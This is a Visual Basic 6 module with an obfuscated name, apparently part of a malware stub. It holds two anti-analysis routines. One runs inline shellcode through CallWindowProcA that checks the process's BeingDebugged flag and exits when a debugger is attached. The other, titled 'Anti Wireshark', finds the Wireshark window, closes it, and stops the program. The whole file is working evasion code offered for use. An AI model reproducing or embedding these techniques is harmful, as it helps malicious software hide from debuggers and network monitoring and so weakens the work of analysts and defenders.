Attribute VB_Name = "h2947th"
'AntiDebugger
Public Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long
Public Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Public Declare Function CallWindowProcA Lib "user32" (ByRef Address As Any, Optional ByVal Param1 As Long, Optional ByVal Param2 As Long, Optional ByVal Param3 As Long, Optional ByVal Param4 As Long) As Long

Public Const sShellcode As String = "64A1300000000FB6400283F80175076A00E8<ADDR>C3"

' Programm  : Anti Wireshark
' Author    : Inmate
' realease  : 21.08.09
' Used for  : Close Wirehark
' Tested On : Windows 7 x64
'---------------------------------------------------------------------------------------
Public Declare Function PostMessage Lib "user32" Alias "PostMessageA" _
(ByVal hwnd As Long, ByVal wMsg As Long, _
ByVal wParam As Long, ByVal lParam As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" _
(ByVal lpClassName As String, ByVal lpWindowName As String) As Long
'---------------------------------------------------------------------------------------

Public Sub AntiDebugger()
    Dim bASM(&HFF)       As Byte
    Dim pExitProcess    As Long
    
    pExitProcess = GetProcAddress(LoadLibraryA("KERNEL32"), "ExitProcess")
    
    Call OPCODES(Replace$(sShellcode, "<ADDR>", Hex$(SwapEndian(pExitProcess - (VarPtr(bASM(0)) + 22)))), bASM)
    Call CallWindowProcA(bASM(0))
End Sub

Public Sub OPCODES(ByVal sThunk As String, ByRef bvTmp() As Byte)
    Dim i               As Long

    For i = 0 To Len(sThunk) - 1 Step 2
        bvTmp((i / 2)) = CByte("&H" & Mid$(sThunk, i + 1, 2))
    Next i
End Sub

Public Function SwapEndian(ByVal dw As Long) As Long
' by Mike D Sutton, Mike.Sutton@btclick.com, 20040914
    SwapEndian = (((dw And &HFF000000) \ &H1000000) And &HFF&) Or ((dw And &HFF0000) \ &H100&) Or ((dw And &HFF00&) * &H100&) Or ((dw And &H7F&) * &H1000000)
    If (dw And &H80&) Then SwapEndian = SwapEndian Or &H80000000
End Function
Public Function WRS()
Dim WireHandle As Long, WireClose As String
WireHandle = FindWindow(vbNullString, "The Wireshark Network Analyzer")
     WireClose = PostMessage _
     (WireHandle, &H10, 0&, 0&)

Select Case WireHandle
    Case Is > 0
        End
End Select
End Function

